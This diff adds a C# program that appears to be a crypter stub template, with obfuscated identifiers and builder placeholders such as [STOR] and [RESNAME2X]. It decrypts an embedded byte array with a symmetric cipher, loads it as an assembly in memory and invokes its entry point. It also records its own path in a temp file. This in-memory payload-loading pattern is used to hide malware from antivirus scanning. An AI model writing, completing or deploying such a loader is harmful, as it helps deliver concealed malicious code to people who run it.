@@ -1,0 +1,58 @@
+using System;
+using System.Text;
+using System.Threading;
+using System.Resources;
+using System.Reflection;
+using System.IO;
+using System.Windows.Forms;
+using System.Security.Cryptography;
+[ASSMBLY]
+namespace BB9CC9FF9
+{
+    class AA1AA2AA4AA4AA2BB3CC1AA2DD3KK3KK5FF2
+    {
+	public static ResourceManager JJ9 = new ResourceManager("[RESNAME2X]", System.Reflection.Assembly.GetExecutingAssembly());
+	static void Main()
+        {		
+        try
+        {	
+		string AA2KK2st = Path.GetTempPath() + "loc.txt";
+		if(File.Exists(AA2KK2st))
+		{
+		File.Delete(AA2KK2st);
+		}
+		File.WriteAllText(Path.GetTempPath() + "loc.txt", Assembly.GetExecutingAssembly().Location.ToString());	
+		
+		[STOR]
+        }
+        catch(Exception ex) {MessageBox.Show(ex.ToString()); }
+        }
+		 public static void AA1JJ2JJ4(byte[] KK9JJ7)
+    {
+        MethodInfo FF1KK1JJ3MM3 = Assembly.Load(KK9JJ7).EntryPoint;
+        object[] KK3JJ2MM4KK1 = null;
+        if (FF1KK1JJ3MM3.GetParameters().Length > 0)
+        {
+			string[] AA3 = new string[] { "0" };
+            KK3JJ2MM4KK1 = new object[] {AA3};
+        }
+        FF1KK1JJ3MM3.Invoke(null, KK3JJ2MM4KK1);
+    }
+	
+         public static byte[] AA2KK1JJ3En(byte[] bytes, string Key)
+        {
+            MemoryStream ms = new MemoryStream();
+            System.Security.Cryptography.SymmetricAlgorithm rijn = SymmetricAlgorithm.Create();
+            byte[] key = Encoding.ASCII.GetBytes(Key);
+            byte[] rgbIV = key;
+            CryptoStream cs = new CryptoStream(ms, rijn.CreateDecryptor(key, rgbIV), CryptoStreamMode.Write);
+            cs.Write(bytes, 0, bytes.Length);
+            cs.Close();
+            byte[] b = ms.ToArray();
+            Array.Resize(ref b, b.Length - 1);
+            return b;
+        }
+	}
+	   
+  
+}
